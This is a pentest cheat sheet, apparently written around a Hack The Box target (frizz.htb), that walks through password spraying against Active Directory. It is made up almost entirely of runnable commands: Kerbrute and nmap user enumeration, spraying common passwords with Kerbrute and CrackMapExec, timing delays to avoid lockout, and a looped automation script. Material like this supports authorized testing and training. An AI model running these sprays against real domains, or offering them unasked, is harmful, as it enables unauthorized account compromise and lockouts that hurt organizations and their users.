# Password Spraying Overview

## 1. User Enumeration with Kerbrute

```bash
kerbrute userenum --dc <domain-controller> -d <domain> usernames.txt
```

Generate GUID-style usernames:

```bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done > usernames.txt
```

Nmap enumeration:

```bash
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=frizz.htb 10.10.11.60
```

## 2. Password Spraying with Kerbrute

```bash
kerbrute passwordspray --dc <domain-controller> -d <domain> -U usernames.txt -p <common-password>
```

## 3. Password Spraying with CrackMapExec (CME)

```bash
cme smb <target-ip> -u usernames.txt -p <password> --no-bruteforce
```

## 4. Obtaining Password Policy (Internal)

```powershell
net accounts
Get-ADDefaultDomainPasswordPolicy
```

## 5. Delay Between Attempts

```bash
for password in Welcome1 Passw0rd Winter2022; do
    cme smb <target-ip> -u usernames.txt -p $password --no-bruteforce
    sleep 1800
done
```

## 6. Handling Large User Lists

```bash
split -l 1000 usernames.txt user_chunk_
for file in user_chunk_*; do
    kerbrute passwordspray --dc <domain-controller> -d <domain> -U $file -p <password>
    sleep 1800
done
```

## 7. Post-Spray Enumeration

```bash
cme smb <target-ip> -u <username> -p <password> --shares
cme smb <target-ip> -u <username> -p <password> --sessions
```

## 8. Basic Automation Script

```bash
#!/bin/bash
PASSWORDS=(Welcome1 Passw0rd Winter2022)
for password in "${PASSWORDS[@]}"; do
    kerbrute passwordspray --dc <domain-controller> -d <domain> -U usernames.txt -p $password
    sleep 1800
done
```
